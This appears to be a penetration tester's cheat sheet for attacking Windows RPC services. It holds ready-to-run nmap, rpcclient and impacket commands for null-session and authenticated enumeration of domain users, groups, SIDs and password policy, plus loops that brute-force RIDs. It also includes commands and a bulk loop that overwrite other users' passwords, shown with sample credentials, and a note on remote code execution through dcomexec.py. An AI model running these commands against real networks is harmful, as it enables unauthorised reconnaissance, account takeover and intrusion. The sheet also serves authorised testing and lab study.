# RPC Checklist

```bash
nmap -sV -p 111 --script=rpcinfo $ip
nmap -sV -p 111 --script=rpc* $ip
rpcdump.py $ip -p 135
rpcclient -U '' -N $ip // when asked enter empty password
rpcclient $ip -N -U "" \\$ip
rpcclient $>srvinfo
rpcclient $>enumdomusers
rpcclient $>querydominfo
rpcclient $>getdompwinfo   //password policy
rpcclient $>netshareenum
nmblookup -A 192.168.1.1
nbtscan IP

rpcclient -k  $dc


#List the ports using RPC
rpcinfo $ip 
> Output would look something like below
    100024    1    udp       0.0.0.0.150.11         status     29
    100024    1    tcp       0.0.0.0.219.244        status     29
    100024    1    udp6      ::.153.127             status     29
    100024    1    tcp6      ::.172.42              status     29

#list accessible RPC service endpoints
rpcinfo -p $ip 

Domain Enumeration with RPcclient
#Enum using Null Session
rpcclient -U "" $ip 

#Login as a user
rpcclient -U USERNAME //$ip 

#Find Users in the domain 
rpcclient -Uuser_Name%PASSWORD -c enumdomusers $ip 

#Find Domian Info
rpcclient -Uuser_Name%PASSWORD -c querydominfo  $ip 

#Find Groups and their Alias
rpcclient -Uuser_Name%PASSWORD -c "enumalsgroups builtin" $ip 

#Find more info using Alias and note SIDs
rpcclient -Uuser_Name%PASSWORD -c "queryaliasmem builtin 0x244" $ip 

#Find more info using SIDs
rpcclient $> lookupsids S-1-5-21-586154515854-343543654-8743952433-1105 

#Reset other Users Password
rpcclient -U user1 //$ip 
setuserinfo2 USER2 23 'PASSWORD'

Enum using RPCClient

rpcclient -U DOMAIN\\Username $ip    #Enter pass 
enumdomusers     #Enumerate Domain Users 
enumprivs        #Enum Privileges
enumprinters    #Enum Printers
srvinfo         #Server info
enumalsgroups domain    #List the domain groups 
enumalsgroups builtin    #list builtin groups
queryuser 500        #find Admin users
lookupnames username/groupname    #Find the SID of a user/group

Dont want to manually check all the commands ? maybe below script will help :P 

#save the below commands as a text file and run the below command
querydominfo
enumdomgroups
enumdomusers
querygroupmem 0x201
enumprivs        
enumprinters    
srvinfo
enumdomgroups
querygroup 0x200
queryuser Administrator
getdompwinfo
getusrdompwinfo 0x1f4
lsaenumsid
lookupnames Administrator
enumalsgroups domain
enumalsgroups builtin 
queryuser 500  
lsaquery
dsroledominfo
netshareenum
netshareenumall
netsharegetinfo Confidential
querydispinfo
lsalookupprivvalue SeImpersonatePrivielge

#Run the below command
for command in $(cat rpc-enum.txt); do rpcclient -U "%" -c $command $ip; done



OVERWRITE SOMEONE'S PASSWORD!!!
```

```bash
rpcclient -N -U "hazel.green%haze1988" $ip
setuserinfo2 MOLLY.SMITH 23 'Password123!'
setuserinfo christopher.lewis 23 'Admin!23'
```

```bash
for name in $(cat users.txt); do rpcclient $ip -U $user%$pass -c "setuserinfo2 $name 23 'Password123!'"; wait; done
```

Automate a bit.

```bash
for command in $(cat /opt/windows/rpc-enum.txt); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "$command"; done
for name in $(cat users.txt.bak); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "queryuser $name"; done
```

```bash
for command in $(cat /opt/rpc-enum.txt); do rpcclient $ip -U "$user%$pass" -c $command; done
for command in $(cat /opt/rpc-enum.txt); do rpcclient $ip -U "%" -c $command; done
for name in $(cat users.txt); do rpcclient $ip -U "%" -c "queryuser $name"; done
```

#### Enumerate Users

```bash
for i in $(seq 500 1100); do rpcclient -N -U "" $ip -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```

```bash
python /opt/ridenum.py $ip 500 1200
```

#### RCE

It is possible to execute remote code on a machine, if the credentials of a valid user are available using dcomexec.py from impacket framework.

Remember to try with the different objects available
    - ShellWindows
    - ShellBrowserWindow
    - MMC20